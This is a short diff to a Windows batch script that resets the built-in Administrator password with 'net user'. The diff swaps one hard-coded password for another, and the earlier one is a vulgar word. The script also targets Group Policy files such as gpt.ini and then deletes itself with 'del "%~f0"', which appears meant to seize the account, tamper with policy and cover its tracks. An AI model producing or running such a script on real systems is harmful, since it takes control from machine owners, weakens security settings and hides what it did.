@@ -1,6 +1,6 @@
 @echo off
 mode con cp select=437 >nul
-net user Administrator KONTOL123
+net user Administrator AYAMGORENG123
 setlocal enabledelayedexpansion
 
 set "files[1]=%windir%\System32\GroupPolicy\gpt.ini"
@@ -16,4 +16,5 @@ for %%i in (1 2) do (
 )
 
 del "%~f0"
+
 
